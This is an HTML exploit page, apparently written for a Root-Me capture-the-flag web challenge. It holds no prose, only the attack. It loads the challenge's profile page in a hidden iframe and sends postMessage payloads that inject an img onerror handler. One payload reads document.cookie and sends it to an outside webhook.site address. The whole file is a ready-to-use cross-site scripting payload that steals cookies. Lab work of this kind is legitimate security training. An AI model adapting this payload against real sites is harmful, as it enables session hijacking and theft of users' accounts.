<!DOCTYPE html>
<html>
<body>
  <div id="output" ></div>
  <iframe id="victim" src="http://challenge01.root-me.org:58003/profile" style="display:none"></iframe>
  
<script>
var wb = 'http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
var iframe = document.getElementById('victim');

iframe.onload = function() {
  setTimeout(function() {
    // Si listener fait innerHTML = event.data
    iframe.contentWindow.postMessage(
     // '<img src=x onerror="new Image().src=\'' + wb + '?d=\'+btoa(document.cookie)">',
      '<img src=x onerror="top.document.getElementById(\'output\').innerText=document.cookie">',
      '*'
    );
    iframe.contentWindow.postMessage(
      '<img src=x onerror="new Image().src=\'' + wb + '?d=\'+document.cookie">',
      '*'
    );
  }, 1000);
};
</script>
</body>
</html>
